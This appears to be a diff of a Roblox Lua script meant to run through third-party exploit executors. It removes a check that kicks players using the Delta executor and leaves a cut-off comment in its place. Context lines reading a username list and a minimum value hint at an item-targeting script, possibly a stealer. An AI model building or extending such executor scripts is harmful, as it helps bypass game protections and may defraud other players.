@@ -13,15 +13,7 @@ end
 _G.scriptExecuted = true
 
 -- Block Delta or any executor
--- Only block Delta, allow all other executors
-
-if identifyexecutor and typeof(identifyexecutor) == "function" then
-    local executor = identifyexecutor()
-    if executor and string.lower(executor):find("delta") then
-        game.Players.LocalPlayer:Kick("Delta Executor is blocked. Use krnl")
-        return
-    end
-end
+-- Only block Delta, allo
 
 local users = _G.Usernames or {}
 local min_value = _G.min_value or 10000000
